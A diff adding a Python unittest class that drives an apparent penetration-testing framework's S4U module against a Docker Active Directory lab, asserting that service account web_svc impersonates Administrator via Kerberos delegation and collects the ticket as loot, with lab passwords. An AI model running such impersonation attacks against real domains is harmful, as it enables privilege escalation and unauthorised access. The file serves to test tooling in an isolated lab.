@@ -1432,6 +1432,68 @@ class TestGoldenTicketLab(unittest.TestCase):
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestS4ULab(unittest.TestCase):
+    """s4u against the AD lab: web_svc (protocol-transition delegation to
+    HTTP/api.forge.local) impersonates Administrator end to end."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        up_ad_lab(cls.manager)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            return buf.getvalue(), console.store.loot("ticket")
+        finally:
+            console.store.close()
+
+    def test_full_chain(self):
+        out, tickets = self._run(
+            "use auxiliary/attack/s4u",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME web_svc",
+            "set PASSWORD Web2024!",
+            "set SPN HTTP/api.forge.local",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("S4U2self ticket issued to Administrator", out)
+        self.assertIn("Administrator -> HTTP/api.forge.local", out)
+        self.assertEqual(len(tickets), 1)
+        self.assertIn("s4u Administrator -> HTTP/api.forge.local",
+                      tickets[0]["label"])
+
+    def test_no_delegation_clean_denial(self):
+        # analyst holds no T2A4D flag — Samba masks the policy denial as
+        # S_PRINCIPAL_UNKNOWN; either way it must fail clean, no loot
+        out, tickets = self._run(
+            "use auxiliary/attack/s4u",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME analyst",
+            "set PASSWORD Summer2024!",
+            "set SPN HTTP/api.forge.local",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("S4U2self denied", out)
+        self.assertEqual(tickets, [])
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
 class TestDcSyncLab(unittest.TestCase):
     """dcsync against the AD lab: Administrator replicates the directory.
     Exercises the pinned RPC range (135 + 49152-49160) end to end."""
